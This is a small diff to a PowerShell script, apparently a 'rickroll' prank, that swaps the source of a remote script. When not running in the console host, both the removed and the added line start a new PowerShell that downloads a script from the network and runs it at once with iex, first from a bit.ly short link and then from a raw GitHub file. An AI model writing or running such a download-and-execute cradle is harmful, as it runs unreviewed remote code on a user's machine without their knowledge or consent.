@@ -1,6 +1,6 @@
 if($host.Name -ne "ConsoleHost")
 {
-    Start-Process powershell -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''http://bit.ly/rRpwSh'')'
+    Start-Process powershell -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''https://github.com/ryanwb3/rickroll/raw/main/roll.p1'')'
     return
 }
 
